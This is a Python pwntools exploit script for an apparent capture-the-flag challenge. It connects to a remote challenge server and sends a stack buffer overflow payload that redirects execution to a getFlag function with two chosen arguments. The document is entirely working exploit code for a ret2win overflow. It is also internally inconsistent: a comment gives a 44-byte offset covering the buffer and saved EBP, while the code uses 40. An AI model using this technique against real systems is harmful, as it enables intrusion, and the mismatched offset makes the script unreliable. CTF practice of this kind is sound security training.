from pwn import *

# Load the binary (32-bit ELF)
binary = ELF('./challenge.elf')

# Connect to remote challenge
p = remote('challenge.ctf.games', 30591)

# Address of getFlag function
getFlag_address = binary.symbols["getFlag"]

# Buffer overflow offset: 40 bytes (buffer) + 4 bytes (saved EBP) = 44 bytes
offset = 40

# Craft the payload:
# [padding] + [getFlag address] + [fake return] + [first arg: 5] + [second arg: 7]
payload = b"A" * offset
payload += p32(getFlag_address)  # Overwrite saved return address with getFlag()
payload += p32(0xdeadbeef)       # Fake return address (won't be used)
payload += p32(5)                # First argument (will be at [ebp+8])
payload += p32(7)                # Second argument (will be at [ebp+12])

# Send the payload and interact
p.sendline(payload)
p.interactive()
